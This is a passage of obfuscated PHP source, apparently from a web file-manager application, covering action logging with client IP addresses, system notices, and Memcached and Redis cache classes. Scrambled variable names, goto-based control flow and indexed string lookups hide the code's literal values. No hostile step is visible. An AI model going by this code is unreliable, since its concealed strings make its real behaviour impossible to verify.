LNG($C³‚¤ŒÖã‡[1987]), $C³‚¤ŒÖã‡[1623] => LNG($C³‚¤ŒÖã‡[1988]), $C³‚¤ŒÖã‡[1989] => LNG($C³‚¤ŒÖã‡[1990]), $C³‚¤ŒÖã‡[1991] => LNG($C³‚¤ŒÖã‡[1992]), $C³‚¤ŒÖã‡[1993] => LNG($C³‚¤ŒÖã‡[1994]), $C³‚¤ŒÖã‡[1617] => LNG($C³‚¤ŒÖã‡[1995]), $C³‚¤ŒÖã‡[1996] => LNG($C³‚¤ŒÖã‡[1997]), $C³‚¤ŒÖã‡[1616] => LNG($C³‚¤ŒÖã‡[1998]), $C³‚¤ŒÖã‡[1999] => LNG($C³‚¤ŒÖã‡[2000]), $C³‚¤ŒÖã‡[2001] => LNG($C³‚¤ŒÖã‡[2002]), $C³‚¤ŒÖã‡[2003] => LNG($C³‚¤ŒÖã‡[2003]), $C³‚¤ŒÖã‡[2004] => LNG($C³‚¤ŒÖã‡[1587]), $C³‚¤ŒÖã‡[2005] => LNG($C³‚¤ŒÖã‡[2006]), $C³‚¤ŒÖã‡[2007] => LNG($C³‚¤ŒÖã‡[2008]), $C³‚¤ŒÖã‡[2009] => LNG($C³‚¤ŒÖã‡[2010]), $C³‚¤ŒÖã‡[2011] => LNG($C³‚¤ŒÖã‡[2012]), $C³‚¤ŒÖã‡[2013] => LNG($C³‚¤ŒÖã‡[2014]), $C³‚¤ŒÖã‡[2015] => LNG($C³‚¤ŒÖã‡[2015]), $C³‚¤ŒÖã‡[2016] => LNG($C³‚¤ŒÖã‡[2017]), $C³‚¤ŒÖã‡[2018] => LNG($C³‚¤ŒÖã‡[2019]), $C³‚¤ŒÖã‡[2020] => LNG($C³‚¤ŒÖã‡[2021]), $C³‚¤ŒÖã‡[2022] => LNG($C³‚¤ŒÖã‡[2023]), $C³‚¤ŒÖã‡[2024] => LNG($C³‚¤ŒÖã‡[2025]), $C³‚¤ŒÖã‡[2026] => LNG($C³‚¤ŒÖã‡[2027])); } private function typeFile() { $EÆ³íÜñ¤à =& $_SERVER[úÎü]; $b¸©ÒÀ£Û³ = array($EÆ³íÜñ¤à[1619] => array($EÆ³íÜñ¤à[1620]), $EÆ³íÜñ¤à[1973] => array($EÆ³íÜñ¤à[2028]), $EÆ³íÜñ¤à[1975] => array($EÆ³íÜñ¤à[2029]), $EÆ³íÜñ¤à[1612] => array($EÆ³íÜñ¤à[1613]), $EÆ³íÜñ¤à[1981] => array(), $EÆ³íÜñ¤à[1983] => array(), $EÆ³íÜñ¤à[1985] => array(), $EÆ³íÜñ¤à[1622] => array($EÆ³íÜñ¤à[1624]), $EÆ³íÜñ¤à[1623] => array($EÆ³íÜñ¤à[1624]), $EÆ³íÜñ¤à[1989] => array($EÆ³íÜñ¤à[2030]), $EÆ³íÜñ¤à[1991] => array($EÆ³íÜñ¤à[2030]), $EÆ³íÜñ¤à[1993] => array($EÆ³íÜñ¤à[2031]), $EÆ³íÜñ¤à[1979] => array($EÆ³íÜñ¤à[2032]), $EÆ³íÜñ¤à[1617] => array($EÆ³íÜñ¤à[2033]), $EÆ³íÜñ¤à[1996] => array($EÆ³íÜñ¤à[2034]), $EÆ³íÜñ¤à[1616] => array($EÆ³íÜñ¤à[1618])); return $b¸©ÒÀ£Û³; } private function typeAll() { goto c™é®ŒïƒÇ; f‚ò½ç‚Æ¿: foreach ($F»ôˆùŒ‰ as $CÄƒã…‚§ƒ => $E†Û®–óÎÆ) { $dæ÷Êõò›¤[$E†Û®–óÎÆ[0]] = $dæ÷Êõò›¤[$CÄƒã…‚§ƒ]; } $dæ÷Êõò›¤[$B”¼É ­»…[1624]] = LNG($B”¼É ­»…[2035]); $dæ÷Êõò›¤[$B”¼É ­»…[2030]] = LNG($B”¼É ­»…[2036]); goto d¿¨ºÇÂÔ¶; d¿¨ºÇÂÔ¶: return $dæ÷Êõò›¤; goto Dø‚‚Ò®±ã; c™é®ŒïƒÇ: $B”¼É ­»… =& $_SERVER[úÎü]; $dæ÷Êõò›¤ = $this->typeList; $F»ôˆùŒ‰ = array_filter($this->typeFile()); goto f‚ò½ç‚Æ¿; Dø‚‚Ò®±ã: } public function addLog($c¦‚»Ù¼Ù³, $Bì“‹”è® = array()) { goto EÃ«²ØÑ—©; EÃ«²ØÑ—©: $eÆ³œš­Œè =& $_SERVER[úÎü]; if (!isset($this->typeList[$c¦‚»Ù¼Ù³])) { return; } $DÑñÍ“‰É¬ = defined($eÆ³œš­Œè[442]) && USER_ID ? USER_ID : (isset($Bì“‹”è®[$eÆ³œš­Œè[1485]]) ? $Bì“‹”è®[$eÆ³œš­Œè[1485]] : 0); goto cò¸†§İ—ö; cò¸†§İ—ö: if (!$DÑñÍ“‰É¬) { $DÑñÍ“‰É¬ = (int) Session::get($eÆ³œš­Œè[1768]); } $D™øÁªŞ‡‘ = get_client_ip(); if (!$Bì“‹”è® || strlen(json_encode($Bì“‹”è®)) >= 1024) { $Bì“‹”è® = array($eÆ³œš­Œè[2037] => $D™øÁªŞ‡‘); } else { if (is_array($Bì“‹”è®)) { $Bì“‹”è®[$eÆ³œš­Œè[2037]] = $D™øÁªŞ‡‘; } else { $Bì“‹”è® = array($eÆ³œš­Œè[1048] => $Bì“‹”è®, $eÆ³œš­Œè[2037] => $D™øÁªŞ‡‘); } } goto bÁ“Ï³»Èï; bÁ“Ï³»Èï: $Bì“‹”è® = array($eÆ³œš­Œè[1476] => Session::sign(), $eÆ³œš­Œè[1477] => $DÑñÍ“‰É¬, $eÆ³œš­Œè[29] => $c¦‚»Ù¼Ù³, $eÆ³œš­Œè[1479] => json_encode($Bì“‹”è®)); parent::add($Bì“‹”è®); goto Aêøºïä§; Aêøºïä§: } public function remove($b§íÉÁÇ£) { $this->where(array($_SERVER[úÎü][401] => $b§íÉÁÇ£))->delete(); } private function _makeOrder($CÌÓ–Óâ = '') { goto a¼‹ğŞÊôÑ; C‹å¿ƒ¯Ä: return $this->order($CÌÓ–Óâ); goto EÕâõÊ×¡¹; a¼‹ğŞÊôÑ: $C‡É°‹Š¿­ =& $_SERVER[úÎü]; $C¤Ä¢ê©‡ì = $C‡É°‹Š¿­[190]; $EÆŞ­Ó•¡Ã = array($C‡É°‹Š¿­[418] => $C‡É°‹Š¿­[419], $C‡É°‹Š¿­[420] => $C‡É°‹Š¿­[421]); goto eÉ±ÏŒ‡ï; eÉ±ÏŒ‡ï: $Aƒœ›½—ã¯ = Input::get($C‡É°‹Š¿­[424], $C‡É°‹Š¿­[7], $C‡É°‹Š¿­[1803], array($C‡É°‹Š¿­[1728], $C‡É°‹Š¿­[420])); $Aƒœ›½—ã¯ = $EÆŞ­Ó•¡Ã[$Aƒœ›½—ã¯]; $CÌÓ–Óâ = $CÌÓ–Óâ . "{$C¤Ä¢ê©‡ì}\x20{$Aƒœ›½—ã¯}"; goto C‹å¿ƒ¯Ä; EÕâõÊ×¡¹: } public function get($F¯ê„´ùÍ¡ = '') { goto c¥óâŠˆóˆ; FÂ²ÊËèã: $eÇ¤ß—Ì•Ø[$DˆÄ«Ù£Õé[361]] = $this->logList($eÇ¤ß—Ì•Ø[$DˆÄ«Ù£Õé[361]]); return $eÇ¤ß—Ì•Ø; goto D›·ôí‰·Æ; fâóòñÁ¯¢: if (!empty($F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[2037]])) { $CÎ›¾õÆˆß[$DˆÄ«Ù£Õé[421]] = array($DˆÄ«Ù£Õé[373], "\x25{$F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[2037]]}\45"); } $eÇ¤ß—Ì•Ø = $this->_makeOrder()->where($CÎ›¾õÆˆß)->selectPage(); if (empty($eÇ¤ß—Ì•Ø[$DˆÄ«Ù£Õé[361]])) { show_json(array(), !0, $eÇ¤ß—Ì•Ø[$DˆÄ«Ù£Õé[358]]); } goto FÂ²ÊËèã; D¨¿Œá­»: if ($F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[1485]]) { $CÎ›¾õÆˆß[$DˆÄ«Ù£Õé[1485]] = $F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[1485]]; } if (isset($F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[703]])) { $AÚãñ÷§ìˆ = $F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[703]]; $C¿½’ºô = isset($F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[464]]) ? $F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[464]] : time(); $CÎ›¾õÆˆß[$DˆÄ«Ù£Õé[190]] = array($DˆÄ«Ù£Õé[327], array($AÚãñ÷§ìˆ, $C¿½’ºô)); } if ($F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[29]]) { $c­®‘Ÿœç” = explode($DˆÄ«Ù£Õé[47], $F¯ê„´ùÍ¡[$DˆÄ«Ù£Õé[29]]); $c£Ğ…ÖÔñª = $this->typeFile(); $dŠÓ’çÊ´ = array(); foreach ($c­®‘Ÿœç” as $dâ­ô¨†¾) { $dŠÓ’çÊ´[] = $dâ­ô¨†¾; if (isset($c£Ğ…ÖÔñª[$dâ­ô¨†¾])) { $dŠÓ’çÊ´ = array_merge($dŠÓ’çÊ´, $c£Ğ…ÖÔñª[$dâ­ô¨†¾]); } } $dŠÓ’çÊ´ = array_unique($dŠÓ’çÊ´); if ($dŠÓ’çÊ´) { $CÎ›¾õÆˆß[$DˆÄ«Ù£Õé[29]] = array($DˆÄ«Ù£Õé[7], $dŠÓ’çÊ´); } } goto fâóòñÁ¯¢; c¥óâŠˆóˆ: $DˆÄ«Ù£Õé =& $_SERVER[úÎü]; if (!$F¯ê„´ùÍ¡) { show_json(array()); } $CÎ›¾õÆˆß = array(); goto D¨¿Œá­»; D›·ôí‰·Æ: } private function ipAddress(&$Dà®†ùÊå) { $eàİÊÕäŸÔ =& $_SERVER[úÎü]; if (!empty($Dà®†ùÊå[$eàİÊÕäŸÔ[2037]])) { $B‘Û”Œƒæ® = IpLocation::get($Dà®†ùÊå[$eàİÊÕäŸÔ[2037]]); } else { $B‘Û”Œƒæ® = LNG($eàİÊÕäŸÔ[2038]); } $Dà®†ùÊå[$eàİÊÕäŸÔ[2039]] = $B‘Û”Œƒæ®; } private function descZipDownload($aÃÒ³å¼Õ, &$Dô­ÅÀïÃô) { $b‡“Ÿæ ¶ =& $_SERVER[úÎü]; if (!isset($aÃÒ³å¼Õ[$b‡“Ÿæ ¶[2040]])) { return; } $AÖÚãÖ–´¤ = json_decode($aÃÒ³å¼Õ[$b‡“Ÿæ ¶[2040]], !0); foreach ($AÖÚãÖ–´¤ as $dŸÌÃ‚–ô…) { try { $DôÊ¨†½Œ = IO::infoFull($dŸÌÃ‚–ô…[$b‡“Ÿæ ¶[75]]); } catch (Exception $e£°´­ô‘«) { continue; } $aÃÒ³å¼Õ[$b‡“Ÿæ ¶[75]] = $dŸÌÃ‚–ô…[$b‡“Ÿæ ¶[75]]; $Dô­ÅÀïÃô[] = $aÃÒ³å¼Õ[$b‡“Ÿæ ¶[385]] = $DôÊ¨†½Œ[$b‡“Ÿæ ¶[385]]; $Dô­ÅÀïÃô[] = $aÃÒ³å¼Õ[$b‡“Ÿæ ¶[1859]] = $DôÊ¨†½Œ[$b‡“Ÿæ ¶[478]]; break; } return $aÃÒ³å¼Õ; } private function getSourceList(&$f‚ë†å¬…ô) { $AŒ®í®‘‡ =& $_SERVER[úÎü]; $e¾õ’ŞÒ°ï = array(); foreach ($f‚ë†å¬…ô as $BÎŒí³§¬¼ => $dÍ•Š–‹¦Ø) { goto dñ›ëÏ§ŒÔ; dñ›ëÏ§ŒÔ: $fî‰…Ş„¹­ = json_decode($dÍ•Š–‹¦Ø[$AŒ®í®‘‡[421]], !0); if ($dÍ•Š–‹¦Ø[$AŒ®í®‘‡[29]] == $AŒ®í®‘‡[1615]) { $fî‰…Ş„¹­ = $this->descZipDownload($fî‰…Ş„¹­, $e¾õ’ŞÒ°ï); $f‚ë†å¬…ô[$BÎŒí³§¬¼][$AŒ®í®‘‡[421]] = json_encode($fî‰…Ş„¹­); continue; } if (strpos($dÍ•Š–‹¦Ø[$AŒ®í®‘‡[29]], $AŒ®í®‘‡[1860]) !== 0) { if (!isset($fî‰…Ş„¹­[$AŒ®í®‘‡[75]]) || strpos($dÍ•Š–‹¦Ø[$AŒ®í®‘‡[29]], $AŒ®í®‘‡[2041]) !== 0) { continue; } try { $c®Ã§ëéÚë = IO::infoFull($fî‰…Ş„¹­[$AŒ®í®‘‡[75]]); } catch (Exception $d„®°˜²—´) { continue; } $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[385]] = $c®Ã§ëéÚë[$AŒ®í®‘‡[385]]; $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[1859]] = $c®Ã§ëéÚë[$AŒ®í®‘‡[478]]; $f‚ë†å¬…ô[$BÎŒí³§¬¼][$AŒ®í®‘‡[421]] = json_encode($fî‰…Ş„¹­); continue; } goto aãÏŠÊê’×; FÄçÚŠÈùƒ: if ($fî‰…Ş„¹­[$AŒ®í®‘‡[29]] == $AŒ®í®‘‡[1867]) { $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[421]][$AŒ®í®‘‡[385]]; } goto Dçµ¸ò÷Áá; aãÏŠÊê’×: $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[385]]; $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[1859]]; if ($fî‰…Ş„¹­[$AŒ®í®‘‡[29]] == $AŒ®í®‘‡[509]) { $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[421]][$AŒ®í®‘‡[1015]]; $e¾õ’ŞÒ°ï[] = $fî‰…Ş„¹­[$AŒ®í®‘‡[421]][$AŒ®í®‘‡[1016]]; } goto FÄçÚŠÈùƒ; Dçµ¸ò÷Áá: } if (!$e¾õ’ŞÒ°ï) { return array(); } return Model($AŒ®í®‘‡[752])->sourceListInfo($e¾õ’ŞÒ°ï, !0); } private function logList($CãÜê¨Î) { goto dßóğ‰‡«Ò; b™•Ş±ó”¨: $e«¯™ÑÈ­ = $this->getSourceList($CãÜê¨Î); $fç™Îµç‚‰ = $this->typeAll(); $c˜È´…·ÛÎ = array(); goto cß‹ˆˆÄ¦²; E‹Ú¸®¾­›: return $c˜È´…·ÛÎ; goto eÆÎ¢¸µÅ‰; cß‹ˆˆÄ¦²: $f¹òŠ’öİ = array(); foreach ($CãÜê¨Î as $a÷Óó¦ËÔ => $AÌÜÅÛ­óŸ) { goto fğù«ÍÂ¶ã; eµ«ÕÎà‡†: $this->ipAddress($AÌÜÅÛ­óŸ); if (strpos($bğ‘Šœïæ‰, $A”ŠçÅÎ [1860]) === 0 || isset($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1859]])) { goto Bø»ã¸Ïãé; Bø»ã¸Ïãé: $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [407]] = $e«¯™ÑÈ­[$D‹Ö‚ÂŠãì[$A”ŠçÅÎ [385]]]; $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1872]] = $e«¯™ÑÈ­[$D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1859]]]; if ($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [29]] == $A”ŠçÅÎ [509]) { $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [1015]] = $e«¯™ÑÈ­[$D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [1015]]]; $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [1016]] = $e«¯™ÑÈ­[$D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [1016]]]; } goto FÁö˜»î©Ã; Cƒ¹Ø‡‰“ò: if ($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1872]] && $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1872]][$A”ŠçÅÎ [387]] == $A”ŠçÅÎ [1126]) { $f¹òŠ’öİ[] = $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [383]]; unset($CãÜê¨Î[$a÷Óó¦ËÔ]); continue; } goto CŞ¶ãƒ¡®; FÁö˜»î©Ã: if ($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [29]] == $A”ŠçÅÎ [1867]) { $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [385]] = $e«¯™ÑÈ­[$D‹Ö‚ÂŠãì[$A”ŠçÅÎ [421]][$A”ŠçÅÎ [385]]]; } if ($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [29]] == $A”ŠçÅÎ [1610]) { $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1872]] = $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [407]]; $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1859]] = $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [1872]][$A”ŠçÅÎ [385]]; $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [407]] = !1; $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [385]] = $A”ŠçÅÎ [33]; } if ($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [407]] && $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [407]][$A”ŠçÅÎ [387]] == $A”ŠçÅÎ [1126]) { $f¹òŠ’öİ[] = $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [383]]; unset($CãÜê¨Î[$a÷Óó¦ËÔ]); continue; } goto Cƒ¹Ø‡‰“ò; CŞ¶ãƒ¡®: } $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [421]] = $D‹Ö‚ÂŠãì; goto EÒÉš•ÀŠ; EÒÉš•ÀŠ: unset($AÌÜÅÛ­óŸ[$A”ŠçÅÎ [2044]]); $c˜È´…·ÛÎ[] = $AÌÜÅÛ­óŸ; goto bâ¨¦‡£ëÀ; fğù«ÍÂ¶ã: $bğ‘Šœïæ‰ = $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [29]]; $BÆ‡øÉÚà = isset($f“³é…ÑÍø[$AÌÜÅÛ­óŸ[$A”ŠçÅÎ [1485]]]) ? $f“³é…ÑÍø[$AÌÜÅÛ­óŸ[$A”ŠçÅÎ [1485]]] : !1; $B™¥¦ƒ…‰ = strpos($bğ‘Šœïæ‰, $A”ŠçÅÎ [2042]) === 0 ? LNG($A”ŠçÅÎ [2043]) : LNG($A”ŠçÅÎ [2038]); goto F¾¦š¥ĞÀ; aµë¾ÌÀøå: $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [1802]] = $BÆ‡øÉÚà; $D‹Ö‚ÂŠãì = json_decode($AÌÜÅÛ­óŸ[$A”ŠçÅÎ [421]], !0); $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [2037]] = isset($D‹Ö‚ÂŠãì[$A”ŠçÅÎ [2037]]) ? $D‹Ö‚ÂŠãì[$A”ŠçÅÎ [2037]] : $A”ŠçÅÎ [33]; goto eµ«ÕÎà‡†; F¾¦š¥ĞÀ: $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [28]] = isset($BÆ‡øÉÚà[$A”ŠçÅÎ [28]]) ? $BÆ‡øÉÚà[$A”ŠçÅÎ [28]] : LNG($A”ŠçÅÎ [2038]); $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [1909]] = isset($BÆ‡øÉÚà[$A”ŠçÅÎ [1909]]) ? $BÆ‡øÉÚà[$A”ŠçÅÎ [1909]] : $A”ŠçÅÎ [33]; $AÌÜÅÛ­óŸ[$A”ŠçÅÎ [1387]] = isset($fç™Îµç‚‰[$bğ‘Šœïæ‰]) ? $fç™Îµç‚‰[$bğ‘Šœïæ‰] : $B™¥¦ƒ…‰; goto aµë¾ÌÀøå; bâ¨¦‡£ëÀ: } $this->clearSystemPathLog($f¹òŠ’öİ); goto E‹Ú¸®¾­›; dßóğ‰‡«Ò: $A”ŠçÅÎ  =& $_SERVER[úÎü]; $E…°¯Øê¤á = array_to_keyvalue($CãÜê¨Î, $A”ŠçÅÎ [33], $A”ŠçÅÎ [1485]); $f“³é…ÑÍø = Model($A”ŠçÅÎ [494])->userListInfo(array_unique($E…°¯Øê¤á)); goto b™•Ş±ó”¨; eÆÎ¢¸µÅ‰: } private function clearSystemPathLog($c²²ààÆ˜) { $E›ˆçø—äá =& $_SERVER[úÎü]; if (count($c²²ààÆ˜) == 0) { return; } $e’æÀñÆËğ = array($E›ˆçø—äá[383] => array($E›ˆçø—äá[7], array_unique($c²²ààÆ˜))); $this->where($e’æÀñÆËğ)->delete(); } public function deviceList($fÉòÂ„îõ, $dÍµÔˆ·¦‚ = 0) { $Cê‹‘”¶÷Ñ =& $_SERVER[úÎü]; $eÒ”î‡è‹¾ = array($Cê‹‘”¶÷Ñ[1485] => $fÉòÂ„îõ, $Cê‹‘”¶÷Ñ[190] => array($Cê‹‘”¶÷Ñ[932], $dÍµÔˆ·¦‚), $Cê‹‘”¶÷Ñ[29] => $Cê‹‘”¶÷Ñ[1583]); $EêïÛÆ™¾î = array(); $c·µŸ”Şóæ = $this->field($Cê‹‘”¶÷Ñ[2045])->where($eÒ”î‡è‹¾)->order($Cê‹‘”¶÷Ñ[1870])->limit(50)->select(); foreach ($c·µŸ”Şóæ as $bÄ²„‹Ÿ => $eÌãÙ“¢Æ) { goto aøÚ½­Åø; aøÚ½­Åø: if ($bÄ²„‹Ÿ > 0 && abs($eÌãÙ“¢Æ[$Cê‹‘”¶÷Ñ[190]] - $c·µŸ”Şóæ[$bÄ²„‹Ÿ - 1][$Cê‹‘”¶÷Ñ[190]]) < 5) { continue; } $c©Ô¼İêä• = json_decode($eÌãÙ“¢Æ[$Cê‹‘”¶÷Ñ[421]], !0); $eÌãÙ“¢Æ[$Cê‹‘”¶÷Ñ[2037]] = isset($c©Ô¼İêä•[$Cê‹‘”¶÷Ñ[2037]]) ? $c©Ô¼İêä•[$Cê‹‘”¶÷Ñ[2037]] : $Cê‹‘”¶÷Ñ[33]; goto A•“´ÛØ¾Ç; A•“´ÛØ¾Ç: unset($c©Ô¼İêä•[$Cê‹‘”¶÷Ñ[2037]]); $CËĞ¾´ó¸  = $this->deviceType($c©Ô¼İêä•[$Cê‹‘”¶÷Ñ[1861]]); if (isset($EêïÛÆ™¾î[$CËĞ¾´ó¸ ])) { continue; } goto Cì¥°¢Ìéó; Cì¥°¢Ìéó: $this->ipAddress($eÌãÙ“¢Æ); $eÌãÙ“¢Æ[$Cê‹‘”¶÷Ñ[421]] = $c©Ô¼İêä•; $EêïÛÆ™¾î[$CËĞ¾´ó¸ ] = $eÌãÙ“¢Æ; goto eâŞå‡ ™ã; eâŞå‡ ™ã: } return array_values($EêïÛÆ™¾î); } public function deviceType($cÛ†²¬¶Õ¼) { return $cÛ†²¬¶Õ¼; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x6e\157\x74\151\143\145\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\x63\x6f\x6e\164\145\156\164", "\x61\165\164\150", "\155\157\144\145", "\164\151\155\x65", "\164\171\x70\x65", "\154\145\x76\145\x6c", "\x65\x6e\x61\142\154\145", "\x73\157\162\164"); public function listData($F¼Ù¼ò™å¢ = false, $d××·àš‡ä = "\x73\157\162\164", $e‘ôŒÍÜ•© = false) { return parent::listData($F¼Ù¼ò™å¢, $d××·àš‡ä, $e‘ôŒÍÜ•©); } public function add($b±‚æ–±Óç) { $a°ìĞˆµô‰ =& $_SERVER[úÎü]; $aöÛÌï©öµ = time(); if ($b±‚æ–±Óç[$a°ìĞˆµô‰[12]] == $a°ìĞˆµô‰[2046]) { $aöÛÌï©öµ = strtotime($b±‚æ–±Óç[$a°ìĞˆµô‰[193]]); } $b±‚æ–±Óç[$a°ìĞˆµô‰[193]] = $aöÛÌï©öµ; return parent::insert($b±‚æ–±Óç); } public function update($Bñ–©«à, $FàÀÕ½Öå) { goto cŸª”æŒœ; AÎ“„ø³¦ê: $eåê’¬±È = time(); if ($FàÀÕ½Öå[$bº‡•ÖĞ»¹[12]] == $bº‡•ÖĞ»¹[2046]) { $eåê’¬±È = strtotime($FàÀÕ½Öå[$bº‡•ÖĞ»¹[193]]); } $FàÀÕ½Öå[$bº‡•ÖĞ»¹[193]] = $eåê’¬±È; goto bØÁ‚·Áéè; cŸª”æŒœ: $bº‡•ÖĞ»¹ =& $_SERVER[úÎü]; $Fë°·ïâÃé = $this->listData($Bñ–©«à); if (!$Fë°·ïâÃé) { return !1; } goto AÎ“„ø³¦ê; bØÁ‚·Áéè: return parent::update($Bñ–©«à, $FàÀÕ½Öå); goto Eİô•áãËÌ; Eİô•áãËÌ: } public function remove($aÀÍ´é¥Éò) { $aÛŠ§ğåî¼ = $this->listData($aÀÍ´é¥Éò); if (!$aÛŠ§ğåî¼ || $aÛŠ§ğåî¼[$_SERVER[úÎü][1126]]) { return !1; } return parent::remove($aÀÍ´é¥Éò); } public function sort($Aİ†æÄòí, $f´ ‰ÑÕ’) { return parent::update($Aİ†æÄòí, $f´ ‰ÑÕ’); } public function enable($Cà¢„¦´¦ö, $D½ëªó… ) { return parent::update($Cà¢„¦´¦ö, array($_SERVER[úÎü][2047] => $D½ëªó… )); } private function initUserOption() { $fØØ¥„ºÛ‘ =& $_SERVER[úÎü]; $this->optionType = $fØØ¥„ºÛ‘[2048]; $this->modelType = $fØØ¥„ºÛ‘[2049]; $this->field = array($fØØ¥„ºÛ‘[2050], $fØØ¥„ºÛ‘[28], $fØØ¥„ºÛ‘[193], $fØØ¥„ºÛ‘[29], $fØØ¥„ºÛ‘[2051], $fØØ¥„ºÛ‘[690], $fØØ¥„ºÛ‘[187]); } public function userNoticeGet($bÆ¾Ê…º³  = false) { $this->initUserOption(); return parent::listData($bÆ¾Ê…º³ , $_SERVER[úÎü][383], !0); } public function userNoticeAdd($e¥Ğ…¤Ò‰) { $F¥À“§Ğ½ø =& $_SERVER[úÎü]; $this->initUserOption(); $C›¨ÑãÓ×Ø = $this->findByKey($F¥À“§Ğ½ø[2050], $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[383]]); if ($C›¨ÑãÓ×Ø) { return !0; } $eˆ¢¨ğ±„Ë = array($F¥À“§Ğ½ø[2050] => $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[383]], $F¥À“§Ğ½ø[28] => $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[28]], $F¥À“§Ğ½ø[193] => $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[193]], $F¥À“§Ğ½ø[29] => isset($e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[29]]) ? $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[29]] : 1, $F¥À“§Ğ½ø[2051] => isset($e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[2051]]) ? $e¥Ğ…¤Ò‰[$F¥À“§Ğ½ø[2051]] : 0, $F¥À“§Ğ½ø[690] => 0, $F¥À“§Ğ½ø[187] => 0); return parent::insert($eˆ¢¨ğ±„Ë); } public function userNoticeEdit($b¾ Õñ§´·, $b„ºœŠ¨ÖÖ) { $this->initUserOption(); return parent::update($b¾ Õñ§´·, $b„ºœŠ¨ÖÖ); } } goto f±¡ª››½ñ; EÔˆÉƒÀ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($d®ùº×§àæ, $B‚»ÅÆãÈä) { $Eˆƒé½µÛ =& $_SERVER[úÎü]; if (!class_exists($Eˆƒé½µÛ[783])) { show_json($Eˆƒé½µÛ[784], !1); } $this->cacheTime = $B‚»ÅÆãÈä; $this->handle = new Memcached(); if (is_array($d®ùº×§àæ[$Eˆƒé½µÛ[785]]) && count($d®ùº×§àæ[$Eˆƒé½µÛ[785]]) >= 1) { foreach ($d®ùº×§àæ[$Eˆƒé½µÛ[785]] as $Eá¦óˆ Æ) { $D³ù›Œèá = explode($Eˆƒé½µÛ[4], $Eá¦óˆ Æ); $this->handle->addServer($D³ù›Œèá[0], $D³ù›Œèá[1]); } } else { $this->handle->addServer($d®ùº×§àæ[$Eˆƒé½µÛ[173]], $d®ùº×§àæ[$Eˆƒé½µÛ[174]]); } } public function set($dÕ¬â±¨‚·, $eå»°“Œİ¨, $E¹°š²öğŞ = false) { $E¹°š²öğŞ = $E¹°š²öğŞ ? $E¹°š²öğŞ : $this->cacheTime; return $this->handle->set($dÕ¬â±¨‚·, $eå»°“Œİ¨, $E¹°š²öğŞ); } public function get($c—ñ–”˜¨¬) { return $this->handle->get($c—ñ–”˜¨¬); } public function remove($e¨ŠÉ¹®Ş) { return $this->handle->delete($e¨ŠÉ¹®Ş); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($féğÄ…‰öâ, $D†Êã‚øËé) { $aœßªÁ…“‰ =& $_SERVER[úÎü]; if (!class_exists($aœßªÁ…“‰[786])) { show_json($aœßªÁ…“‰[787], !1); } $this->cacheTime = $D†Êã‚øËé; $B ¤Öœïˆë = isset($féğÄ…‰öâ[$aœßªÁ…“‰[788]]) ? $féğÄ…‰öâ[$aœßªÁ…“‰[788]] : 10; $b¹…ŸñÃ´ª = _get($féğÄ…‰öâ, $aœßªÁ…“‰[785]); if ($b¹…ŸñÃ´ª && is_array($b¹…ŸñÃ´ª)) { $this->initCluster($féğÄ…‰öâ, $B ¤Öœïˆë); } else { $this->handle = $this->init($féğÄ…‰öâ, $B ¤Öœïˆë); } } private function init($AĞ…ÉÙÏ¹, 